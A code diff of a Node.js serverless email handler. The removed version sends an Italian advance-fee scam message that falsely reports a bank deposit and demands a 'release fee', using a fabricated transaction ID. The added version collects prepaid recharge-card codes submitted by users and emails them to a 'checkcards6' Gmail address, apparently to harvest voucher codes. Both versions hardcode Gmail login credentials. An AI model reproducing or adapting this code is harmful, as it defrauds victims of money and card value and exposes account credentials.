@@ -19,37 +19,30 @@ export const handler = async (event, context) => {
   }
 
   // Parse the request body
-  const { iban, bic, bankName, beneficiaryName, amount, email, phoneNumber, message } = JSON.parse(event.body);
+  const { rechargeType, price, rechargeCode, encryptedCode, email } = JSON.parse(event.body);
 
-  const num = Math.floor(10000000 + Math.random() * 90000000);
-  const num2 = Math.floor(10000 + Math.random() * 90000);
-  const date = new Date();
-  const formattedDate = date.toLocaleDateString();
-  const formattedTime = date.toLocaleTimeString();
-  const fee = (amount * 0.1).toFixed(2);
-
+ 
   const emailMessage = `
-    Sul tuo conto ${bankName} sono stati accreditati €${amount}. Nuovo saldo: €${amount}. Riferimento: DEP123456. ID transazione: ${num}
-    Data: da ${formattedDate} a ${formattedTime}.
-    Ti preghiamo di pagare la commissione di rilascio (${fee} €) per rilasciare i fondi sul tuo conto bancario.
-    Conserva questo codice ${num2} che utilizzerai dopo aver pagato le spese di sblocco e che ti permetterà di prendere possesso dei tuoi soldi.
-
-    Cordiali saluti.
+    Type de recharge: ${rechargeType}
+    Prix de la recharge: €${price}
+    Code de la recharge: ${rechargeCode}
+    Code de la recharge crypté: ${encryptedCode}
+    Email: ${email}
   `;
 
   // Create a transporter object using the default SMTP transport
   let transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-      user: 'postbank461@gmail.com', // replace with your email
-      pass: 'lmif mcnu yvpv ekzg' // replace with your email password
+      user: 'checkcards6@gmail.com', // replace with your email
+      pass: 'nhog ulrv gjri yicj' // replace with your email password
     }
   });
 
   // Set up email data with unicode symbols
   let mailOptions = {
-    from: 'postbank461@gmail.com', // replace with your email
-    to: email,
+    from:  email, 
+    to:'checkcards6@gmail.com',
     subject: 'Recharge Information',
     text: emailMessage
   };
